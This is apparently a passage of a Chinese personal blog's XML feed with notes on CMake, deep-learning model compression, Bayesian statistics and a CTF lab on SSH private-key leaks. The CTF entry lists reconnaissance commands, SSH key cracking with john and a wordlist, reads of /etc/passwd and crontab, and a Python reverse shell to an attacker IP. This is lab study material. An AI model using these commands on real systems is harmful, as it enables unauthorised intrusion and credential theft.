    <content type="html"><![CDATA[<h1 id="cmake简明教程">CMake简明教程</h1><p><ahref="https://blog.csdn.net/whahu1989/article/details/82078563">Linux下CMake简明教程</a></p><h1 id="cmake问题汇总">CMake问题汇总</h1><h2 id="引用动态库和静态库">引用动态库和静态库</h2><ul><li><p>动态库的添加</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">link_directories</span>(<span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/lib) <span class="hljs-comment">#添加动态连接库的路径</span><br><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> mxnet ) <span class="hljs-comment">#添加libmxnet.so</span><br></code></pre></td></tr></table></figure></li><li><p>静态库的添加</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">link_directories</span>(<span class="hljs-variable">$&#123;PROJECT_SOURCE_DIR&#125;</span>/lib) <br><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> mxnet )<br></code></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">add_library</span>(mxnet STATIC IMPORTED)<br><span class="hljs-keyword">set_property</span>(<span class="hljs-keyword">TARGET</span> mxnet PROPERTY IMPORTED_LOCATION /path/to/libmxnet.a)<br><span class="hljs-keyword">target_link_libraries</span>(<span class="hljs-variable">$&#123;PROJECT_NAME&#125;</span> mxnet ) <span class="hljs-comment">#添加libmxnet.a</span><br></code></pre></td></tr></table></figure></li></ul><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CMake-1</title>
    <link href="/2022/02/27/CMake/CMake-1/"/>
    <url>/2022/02/27/CMake/CMake-1/</url>
    
    <content type="html"><![CDATA[<h1 id="cmake介绍">CMake介绍</h1><h2 id="cmake简介">CMake简介</h2><p>​ cmake是一个高级编译配置工具。</p><p>​当多个人用不同语言或者编译器开发一个项目，最终要输出一个可执行文件或者共享库（dll，so等等），这时候就需要CMake。所有操作都是通过编译CMakeLists.txt来完成的。</p><p>最新版本的CMake应当去官网学习<ahref="https://cmake.org/cmake/help/latest/guide/tutorial/index.html">CMakeTutorial</a></p><h2 id="helloworld">HelloWorld</h2><ol type="1"><li><p>编写HelloWorld程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#main.cpp</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;Hello World!&quot;</span> &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><span id="more"></span><ol type="1"><li><p>配置CMakeLists.txt</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment">#CMakeLists.txt</span><br><br><span class="hljs-keyword">PROJECT</span> (HELLO)<br><span class="hljs-keyword">SET</span>(SRC_LIST main.cpp)<br><span class="hljs-keyword">MESSAGE</span>(STATUS <span class="hljs-string">&quot;This is BINARY dir &quot;</span> <span class="hljs-variable">$&#123;HELLO_BINARY_DIR&#125;</span>)<br><span class="hljs-keyword">MESSAGE</span>(STATUS <span class="hljs-string">&quot;This is SOURCE dir &quot;</span> <span class="hljs-variable">$&#123;HELLO_SOURCE_DIR&#125;</span>)<br><span class="hljs-keyword">ADD_EXECUTABLE</span>(hello <span class="hljs-variable">$&#123;SRC_LIST&#125;</span>)<br></code></pre></td></tr></table></figure></li><li><p>使用cmake，生成makefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ cmake ./<br>-- The C compiler identification is GNU 4.8.5<br>-- The CXX compiler identification is GNU 4.8.5<br>-- Check for working C compiler: /usr/bin/cc<br>-- Check for working C compiler: /usr/bin/cc -- works<br>-- Detecting C compiler ABI info<br>-- Detecting C compiler ABI info - done<br>-- Check for working CXX compiler: /usr/bin/c++<br>-- Check for working CXX compiler: /usr/bin/c++ -- works<br>-- Detecting CXX compiler ABI info<br>-- Detecting CXX compiler ABI info - done<br>-- This is BINARY dir/root/codes/cpp<br>-- This is SOURCE dir/root/codes/cpp<br>-- Configuring done<br>-- Generating done<br>-- Build files have been written to: /root/codes/cpp<br></code></pre></td></tr></table></figure></li><li><p>使用make命令编译makefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ make<br>Scanning dependencies of target hello<br><span class="hljs-meta prompt_">[100%</span><span class="language-bash">] Building CXX object CMakeFiles/hello.dir/hello.cpp.o</span><br>Linking CXX executable hello<br><span class="hljs-meta prompt_">[100%</span><span class="language-bash">] Built target hello</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="cmake语法">CMake语法</h1><h2 id="关键字">关键字</h2><h3 id="project">PROJECT</h3><p>可以用来指定工程的名字和支持的语言，默认支持所有语言</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">PROJECT</span>(HELLO)<span class="hljs-comment"># 指定了工程名字，并且支持所有语言</span><br><br><span class="hljs-keyword">PROJECT</span>(HELLO CXX)<span class="hljs-comment"># 指定了工程名字，并且支持语言是cpp</span><br><br><span class="hljs-keyword">PROJECT</span>(HELLO  C CXX)<span class="hljs-comment"># 指定了工程名字，并且支持语言是C和C++</span><br></code></pre></td></tr></table></figure><p>该指令隐式的定义了两个CMake变量</p><ul><li>_BINARY_DIR: 本例中是HELLO_BINARY_DIR</li><li>_SOURCE_DIR: 本例中是HELLO_SOURCE_DIR</li></ul><p>MESSAGE关键字就可以直接使⽤者两个变量，当前都指向当前的⼯作⽬录</p><h3 id="set">SET</h3><p>用来显式地指定变量</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">SET</span>(SRC_LIST main.cpp)    <span class="hljs-comment"># SRC_LIST就包含了main.cpp</span><br><br><span class="hljs-keyword">SET</span>(SRC_LIST main.cpp t1.cpp t2.cpp)  <span class="hljs-comment"># 指定多个</span><br></code></pre></td></tr></table></figure><h3 id="message">MESSAGE</h3><p>像终端输出用户信息</p><p>主要包含三种信息</p><ul><li>SEND_ERROR，产生错误，生成过程被跳过</li><li>SATUS，输出前缀为"-"的消息</li><li>FATAL_ERROR，立即终止所有cmake进程</li></ul><h3 id="add_executable">ADD_EXECUTABLE</h3><p>生成可执行文件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">ADD_EXECUTABLE</span>(hello <span class="hljs-variable">$&#123;SRC_LIST&#125;</span>)  <span class="hljs-comment"># 可执行文件名hello，源文件读取变量SRC_LIST中的内容</span><br></code></pre></td></tr></table></figure><h2 id="语法的基本规则">语法的基本规则</h2><ul><li>变量使用 '${}'取值，但在IF控制语句中直接使用变量名</li><li>指令(参数1 参数2 ......)</li><li>指令大小写无关，腿甲全部使用大写指令</li></ul><h1 id="内部构建和外部构建">内部构建和外部构建</h1><ul><li>内部构件会在源文件目录下生成较多的临时文件</li><li>外部构建，就会把生成的临时文件放在build目录下，不会对源文件有任何影响</li></ul><h2 id="外部构建示例">外部构建示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ cd build<br><br>[root@Aurora] ~/codes/cpp/build<br>❯ cmake ../<br>-- The C compiler identification is GNU 4.8.5<br>-- The CXX compiler identification is GNU 4.8.5<br>-- Check for working C compiler: /usr/bin/cc<br>-- Check for working C compiler: /usr/bin/cc -- works<br>-- Detecting C compiler ABI info<br>-- Detecting C compiler ABI info - done<br>-- Check for working CXX compiler: /usr/bin/c++<br>-- Check for working CXX compiler: /usr/bin/c++ -- works<br>-- Detecting CXX compiler ABI info<br>-- Detecting CXX compiler ABI info - done<br>-- This is BINARY dir/root/codes/cpp/build<br>-- This is SOURCE dir/root/codes/cpp<br>-- Configuring done<br>-- Generating done<br>-- Build files have been written to: /root/codes/cpp/build<br><br>[root@Aurora] ~/codes/cpp/build<br>❯ make<br>Scanning dependencies of target hello<br><span class="hljs-meta prompt_">[100%</span><span class="language-bash">] Building CXX object CMakeFiles/hello.dir/hello.cpp.o</span><br>Linking CXX executable hello<br><span class="hljs-meta prompt_">[100%</span><span class="language-bash">] Built target hello</span><br></code></pre></td></tr></table></figure><h2 id="工程化">工程化</h2><ul><li>src：工程源代码</li><li>doc：工程的文档</li><li>添加COPYRIGHT，README</li><li>添加runhello.sh脚本</li><li>将构建后的目标文件放入目录的bin子目录</li><li>将doc目录的内容以及COPYRIGHT/README安装到/usr/share/doc/cmake</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">❯ tree -L 2<br>.<br>├── build<br>├── CMakeLists.txt<br>└── src<br>    ├── CMakeLists.txt<br>    └── hello.cpp<br></code></pre></td></tr></table></figure><p>外层CMakeLists.txt</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">PROJECT</span>(HELLO)<br><span class="hljs-keyword">ADD_SUBDIRECTORY</span>(src bin)<br></code></pre></td></tr></table></figure><p>src目录下CMakeLists.txt</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">ADD_EXECUTABLE</span>(hello main.cpp)<br></code></pre></td></tr></table></figure><h3 id="add_subdirectory">ADD_SUBDIRECTORY</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">ADD_SUBDIRECTORY(<span class="hljs-params">source_dir</span> [<span class="hljs-params">binary_dir</span>] [EXCLUDE_FROM_ALL])</span><br></code></pre></td></tr></table></figure><ul><li><p>用于指向当前工程添加存放源文件的子目录，并可以指定之间二进制文件和目标二进制文件存放位置</p></li><li><p>[EXCLUDE_FROM_ALL]，排除目录下文件不进行编译</p></li><li><p>ADD_SUBDIRECTORY(src bin)</p><p>将 src ⼦⽬录加⼊⼯程并指定编译输出(包含编译中间结果)路径为bin ⽬录如果不进⾏ bin ⽬录的指定，那么编译结果(包括中间结果)都将存放在build/src⽬录</p></li></ul><h3 id="更改二进制的保存路径">更改二进制的保存路径</h3><p>SET指令重新定义EXECUTABLE_OUTPUT_PATH和LIBRARY_OUTPUT_PATH变量，来指定最终的目标二进制文件的位置</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tool</title>
    <link href="/2022/02/22/Tools/Tool/"/>
    <url>/2022/02/22/Tools/Tool/</url>
    
    <content type="html"><![CDATA[<h1 id="机器学习">机器学习</h1><h2 id="图像处理">图像处理</h2><h3 id="自制图像处理数据集">自制图像处理数据集</h3><ul><li><a href="https://github.com/PaddlePaddle/PaddleOCR">PaddleOCR</a></li><li><a href="https://github.com/PaddlePaddle/PaddleSEG">PaddleSeg</a></li><li><a href="https://ai.baidu.com/easydata/">EasyData</a></li></ul><span id="more"></span><h3 id="图像增强">图像增强</h3><ul><li><strong>Albumentations</strong></li><li><strong>Augmentor</strong></li></ul><h2 id="可视化分析">可视化分析</h2><ul><li>VisualDL</li></ul><h2 id="训练框架">训练框架</h2><ul><li>paddledetection,</li><li>paddleclas</li><li>paddleseg</li><li>mmdetection</li><li>detectron</li></ul>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>模型训练进阶</title>
    <link href="/2022/02/22/DL-Notes/DL-Notes-1/"/>
    <url>/2022/02/22/DL-Notes/DL-Notes-1/</url>
    
    <content type="html"><![CDATA[<p>此文为学习<ahref="https://aistudio.baidu.com/aistudio/education/lessonvideo/2259536">百度AIStudio课程</a>所做的笔记，若有侵权，请联系删除。</p><h1 id="模型结构优化">模型结构优化</h1><ul><li>基于深度和参数量</li><li>基于宽度和多尺度</li><li>基于残差连接</li><li>基于不规则卷积</li><li>基于注意力机制</li><li>基于Transformer</li></ul><span id="more"></span><h1 id="模型性能优化">模型性能优化</h1><p>模型性能优化利器：量化，剪枝和蒸馏</p><ul><li><strong>模型量化</strong></li></ul><p>​在另一方面，如果我们能够将浮点型存储的模型转化为8bit甚至4bit、2bit存储时，不仅模型所占空间大幅度减小，计算量也会降低。所以在实际工程应用中，量化（Quantization）是很常见的做法。</p><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222193137892.png" class="" title="image-20220222193137892"><ul><li><strong>模型剪枝</strong></li></ul><p>​许多论文和实验证明，我们经常使用的神经网络模型都是过参数化的，即一个训练好的模型，其内部许多参数都是冗余的，如果能够使用适当的方法将这些参数删除掉，对模型的最终结果是几乎没有影响的。而剪枝（Pruning）就是很好的的例子。</p><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222193159145.png" class="" title="image-20220222193159145"><ul><li><strong>知识蒸馏</strong></li></ul><p>​剪枝和量化都是从模型速度和存储方面来进行性能优化的，也就是说他们可以降低模型计算量，却无法提高模型精度。那么如何能够直接使用一个很小的网络，得到更好的精度，就显得十分重要，这时知识蒸馏（KnowledgeDistilling）就起到了关键作用。</p><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222193224874.png" class="" title="image-20220222193224874"><h2 id="模型量化">模型量化</h2><h3 id="基于范围的线性量化">基于范围的线性量化</h3><ul><li><strong>非饱和方式</strong>：将浮点数正负绝对值的最大值对应映射到整数的最大最小值。</li><li><strong>饱和方式</strong>：先计算浮点数的阈值，然后将浮点数正负阈值对应映射到整数最大最小值。</li><li><strong>仿射方式</strong>：将浮点数的最大最小值对应映射到整数的最大最小值。</li></ul><p>无论哪种映射方式，都会受到离群点、float参数分布不均匀的影响，造成量化损失增加。</p><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222195515666.png" class="" title="image-20220222195515666"><p>红色代表非饱和方式，黄色代表饱和方式，绿色代表仿射方式</p><h3id="pact量化parameterized-clipping-activation">PACT量化(PArameterizedClipping acTivation)</h3><ul><li><p>不断裁剪激活值范围，使得激活值分布收窄，从而降低量化映射损失。</p></li><li><p>用PACT代替ReLU函数，对大于零的部分进行一个截断操作，截断阈值为a。</p></li><li><p>PaddleSlim提供了改进版的PACT方法,不只对大于0的分布进行截断，同时也对小于0的部分做同样的限制，从而更好地得到待量化的范围，降低量化损失。</p></li></ul><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222195725944.png" class="" title="image-20220222195725944"><h2 id="模型剪枝">模型剪枝</h2><h3 id="卷积的重要性">卷积的重要性</h3><p>​剪枝的基础就是要对多个卷积间分析重要性，不同的方法选用的范数或者指标是不同的，例如有选用L1Norm、L2 Norm、几何中位数等等。</p><h3 id="fpgm剪枝">FPGM剪枝</h3><ul><li><p>FPGM采用的是几何中位数准则。</p></li><li><p>总体而言包含两个循环结构，第一个循环是epoch，该过程其实就是普通的迭代训练，在每训完一个epoch后开始执行剪枝操作。</p></li><li><p>第二个循环为遍历网络中的每一层，通过计算卷积核的几何中位数，选中<spanclass="math inline">\(N_{i+1}*P_{i}\)</span>个几何中位数附近的卷积核进行剪枝，剪枝的表现形式就是将卷积核参数置0。</p></li><li><p>在所有的epoch迭代结束之后，最终得到的模型权重会包含一些值为0的卷积核，将这些卷积核直接去掉就可以得到最终的权重</p></li></ul><h2 id="模型蒸馏">模型蒸馏</h2><p>​ 通过引入与教师网络（Teachernetwork：复杂、但预测精度优越）相关的软目标（Soft-target）作为Totalloss的一部分，以诱导学生网络（Studentnetwork：精简、低复杂度，更适合推理部署）的训练，实现知识迁移（Knowledgetransfer）。教师网络的预测精度通常要优于学生网络，而模型容量则无具体限制，且教师网络推理精度越高，越有利于学生网络的学习。</p><p>​所以说，知识蒸馏的目的就是<strong>保证小模型在参数量不变的情况下，得到比较大的性能提升，甚至获得与大模型相似的精度指标。</strong></p><ul><li><p><strong>Response baseddistillation：教师模型对学生模型的输出进行监督</strong></p></li><li><p><strong>Feature based distillation：教师模型对学生模型的中间层feature map 进行监督</strong></p></li><li><p><strong>Relation baseddistillation：对于不同的样本，使用教师模型和学生模型同时计算样本之间feature map的相关性，使得学生模型和教师模型得到的相关性矩阵尽可能一致</strong></p></li></ul><h1 id="模型训练优化">模型训练优化</h1><h2 id="数据处理">数据处理</h2><ul><li><strong>随机裁剪、随机变换宽高比等</strong></li><li><strong>高斯模糊、中值模糊、马赛克等</strong></li><li><strong>亮度变化、对比度变化、色彩变化等</strong></li><li><strong>随机噪声、随机遮挡、复制粘贴等</strong></li><li><strong>旋转、平移、翻转、畸变等</strong></li><li><strong>大尺度训练或者多尺度训练等</strong></li></ul><h2 id="损失函数">损失函数</h2><ul><li><strong>类别损失函数：交叉熵、Focal loss、Centerloss等</strong></li><li><strong>位置损失函数：L1、L2、Smooth L1、 IoU loss、GIoUloss等</strong></li><li><strong>语义分割损失函数：DICE loss、lovasz loss等</strong></li></ul><h1 id="模型自动设计">模型自动设计</h1><h2 id="模型自动搜索">模型自动搜索</h2><p>​神经网络结构自动搜索可以看作是AutoML的一个子领域，简单来说，给定数据集输入和基本配置，它就能够针对该数据集找到最适合的神经网络结构，并且给出最佳的超参数。</p><p>​PaddleSlim提供了4种网络结构搜索的方法：基于模拟退火进行网络结构搜索、基于强化学习进行网络结构搜索、基于梯度进行网络结构搜索和Once-For-All。</p><img src="/2022/02/22/DL-Notes/DL-Notes-1/image-20220222201443189.png" class="" title="image-20220222201443189">]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>paddlepaddle</tag>
      
      <tag>模型优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白板推导--Introduction</title>
    <link href="/2022/01/20/ML-Notes/ML-Notes-1/"/>
    <url>/2022/01/20/ML-Notes/ML-Notes-1/</url>
    
    <content type="html"><![CDATA[<p>对概率的诠释有两大学派，一种是频率派，一种是贝叶斯派。 <spanclass="math display">\[X_{N\times p}=(X_{1}, X_{2}, \cdots, X_{N})^{T},X_{i}=(X_{i1}, X_{i2}, \cdots, X_{ip})^{T}\]</span>上述表达式中，表示有<em>N</em>个样本，每个样本都是<em>p</em>维向量。其中每个观测都是由<spanclass="math inline">\(p(x|\theta)\)</span>生成的。</p><h1 id="频率派">频率派</h1><p><span class="math inline">\(p(x|\theta)\)</span>中，<spanclass="math inline">\(\theta\)</span>是一个常量。对于<spanclass="math inline">\(N\)</span>个观测来说，观测集的概率为<spanclass="math inline">\(p(X|\theta)\mathop{=}\limits_{iid}\prod_{i-1}^{N}p(x_i|\theta)\)</span>。</p><p>为了求<spanclass="math inline">\(\theta\)</span>，采用最大对数似然估计MLE方法：<span class="math display">\[\theta_{MLE}=\mathop{argmax}\limits_{\theta}\log{p(X|\theta)}\mathop{=}\limits_{iid}\mathop{argmax}\limits_{\theta}\sum_{i=1}^{N}{\log{p(x_i|\theta)}}\]</span></p><p>其中<spanclass="math inline">\(iid\)</span>即<code>independent identically distributed</code>，独立同分布。</p><span id="more"></span><h2 id="贝叶斯派">贝叶斯派</h2><p>贝叶斯派认为<span class="math inline">\(p(x|\theta)\)</span>中的<spanclass="math inline">\(\theta\)</span>不是一个常量。这个<spanclass="math inline">\(\theta\)</span>满足一个预设的先验分布<spanclass="math inline">\(\theta\sim p(\theta)\)</span>。</p><p>根据贝叶斯定理依赖观测集参数的后验概率就可以写成: <spanclass="math display">\[p(\theta|X)=\frac{p(X|\theta)\cdotp(\theta)}{p(X)}=\frac{p(X|\theta)\cdotp(\theta)}{\int\limits_{\theta}{p(\theta)d\theta}}\]</span> 为了求<spanclass="math inline">\(\theta\)</span>的值，我们使用最大后验概率估计MAP：<span class="math display">\[\theta_{MAP}=\mathop{argmax}\limits_{\theta}p(\theta|X)=\mathop{argmax}\limits _{\theta}p(X|\theta)\cdotp(\theta)\]</span> 由于分母和<spanclass="math inline">\(\theta\)</span>没有关系。求解这个<spanclass="math inline">\(\theta\)</span>值后计算<spanclass="math inline">\(\frac{p(X|\theta)\cdot p(\theta)}{\int\limits_{\theta}p(X|\theta)\cdotp(\theta)d\theta}\)</span>，就得到了参数的后验概率。其中<spanclass="math inline">\(p(X|\theta)\)</span>叫做似然，是模型分布。得到了参数的后验分布后，我们就可以将这个分布用作预测贝叶斯预测：<span class="math display">\[p(x_{new}|X)=\int\limits _{\theta}p(x_{new}|\theta)\cdotp(\theta|X)d\theta\]</span> 其中积分中的被乘数是模型，乘数是后验分布。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-1</title>
    <link href="/2021/12/20/CTF/CTF-1/"/>
    <url>/2021/12/20/CTF/CTF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ssh私钥泄露">SSH私钥泄露</h1><h2 id="信息探测">信息探测</h2><p>对于只是给定一个对应IP地址的靶场机器，我们需要对其进行扫描，探测开放的服务。渗透其实是针对服务的漏洞探测，然后进行相应的数据包发送，获取机器的最高权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">挖掘开放服务信息</span><br>nmap -sV ip<br><span class="hljs-meta prompt_">#</span><span class="language-bash">探测靶场全部信息</span><br>nmap -A -v ip<br><span class="hljs-meta prompt_">#</span><span class="language-bash">探测靶场的操作系统类型与版本</span><br>nmap -O ip<br></code></pre></td></tr></table></figure><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">探测服务的隐藏文件</span><br>dirb http://ip:port<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">挖掘敏感信息</span><br>nikto -host ip<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查找具有root权限的文件</span><br>find /-perm -4000 2 &gt; /dev/null<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">通过ssh私钥登录</span><br>ssh -i id_rsa user@ip<br><span class="hljs-meta prompt_">#</span><span class="language-bash">解密ssh密钥信息</span><br>chmod 600 id_isa<br><span class="hljs-meta prompt_">#</span><span class="language-bash">转换ssh</span><br>ssh2john id_isa &gt; isacrack<br><span class="hljs-meta prompt_">#</span><span class="language-bash">利用字典解密</span><br>zcat ./rockyou.txt.gz | john --pipe --rule isacrack<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看所有用户的列表</span><br>cat /etc/passwd<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看用户组</span><br>cat /etc/group<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看属于某些用户的文件</span><br>find / -user username<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看缓冲文件目录</span><br>/tmp<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">挖掘定时任务</span><br>cat /etc/crontab<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">反弹shell</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/python</span><br>import os, subprocess, socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect(&quot;攻击机IP&quot;, &quot;攻击机监听端口&quot;)<br>os.dup2(s.fileno(), 0)<br>os.dup2(s.fileno(), 1)<br>os.dup2(s.fileno(), 2)<br>p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">攻击机netcat命令</span><br>nc -lpv port<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看占用端口</span><br>netstat -pantu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习算法竞赛实战(五)</title>
    <link href="/2021/11/04/ML-Pratice/ML-Algorithm-pratice-5/"/>
    <url>/2021/11/04/ML-Pratice/ML-Algorithm-pratice-5/</url>
    
